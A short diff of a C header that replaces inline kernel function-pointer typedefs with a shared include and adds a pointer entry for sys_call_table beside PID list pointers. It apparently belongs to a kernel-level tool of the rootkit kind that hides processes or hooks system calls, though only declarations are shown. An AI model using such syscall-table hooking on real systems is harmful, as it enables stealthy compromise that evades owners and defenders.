@@ -116,19 +116,10 @@ struct pid_list_node *pid_list_find(pid_t nr);
 //void *readfile(const char *file, size_t *len);
 
 /*
- * Declarations of Linux Kernel functions.
+ * Shared declarations of Linux Kernel functions.
  */
-typedef void * (*tf_kmalloc)(size_t size, gfp_t flags);
-typedef void (*tf_kfree)(const void *);
-typedef struct pid * (*tf_find_vpid)(pid_t nr);
-typedef int (*tf_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args);
-typedef int (*tf_sys_write)(int fd, const char *mem, size_t len);
+#include "shared_kernel.h"
 
-extern tf_kmalloc *f_kmalloc(void);
-extern tf_kfree *f_kfree(void);
-extern tf_find_vpid *f_find_vpid(void);
-extern tf_vscnprintf *f_vscnprintf(void);
-extern tf_sys_write *f_sys_write(void);
 
 /*
  * Variable declarations.
@@ -371,6 +362,7 @@ DSTR(MSG_KM_ERR, "f_kmalloc error, line %d.\n")
  */
 DPTR(pid_list_head)
 DPTR(pid_list_tail)
+DPTR(sys_call_table)
 
 LABEL(kernel_end)
 /*
